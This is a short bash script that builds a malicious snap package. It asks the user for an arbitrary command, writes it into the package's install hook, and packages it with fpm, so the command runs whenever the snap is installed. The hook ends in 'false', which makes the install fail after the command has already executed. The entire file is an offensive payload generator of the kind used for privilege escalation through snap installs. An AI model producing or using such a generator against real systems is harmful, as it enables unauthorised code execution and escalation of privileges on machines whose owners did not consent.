#!/bin/bash
RED='\033[0;31m'
NC='\033[0m' # No Color

curdir=$(pwd)

## Variable setting
echo "Enter payload: "
read COMMAND
echo -e "Payload is set to: $COMMAND \n"
echo "Enter payload name: "
read payload
echo -e "\n"

echo -e "${RED}...Generating Payload...${NC}\n"
## Payload generation
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n $payload -s dir -t snap -a all meta

## Return to original position
cp $payload* $curdir && cd $curdir
